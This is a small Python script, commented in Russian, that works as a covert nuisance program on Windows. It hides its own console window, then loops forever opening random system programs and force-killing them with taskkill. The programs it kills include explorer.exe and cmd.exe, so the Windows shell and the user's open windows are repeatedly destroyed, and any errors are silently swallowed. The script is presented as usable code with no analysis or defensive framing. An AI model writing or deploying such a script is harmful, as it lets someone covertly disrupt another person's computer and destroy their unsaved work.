#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import subprocess
import ctypes

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def open_random_apps():
    apps = [
        'notepad.exe',
        'calc.exe',
        'mspaint.exe',
        'explorer.exe',
        'cmd.exe'
    ]
    
    while True:
        try:
            # Открываем случайное приложение
            app = random.choice(apps)
            subprocess.Popen(app)
            time.sleep(random.randint(5, 15))
            
            # Закрываем случайное приложение
            os.system(f'taskkill /f /im {app}')
            time.sleep(random.randint(2, 5))
        except:
            pass

if __name__ == "__main__":
    hide_console()
    open_random_apps() 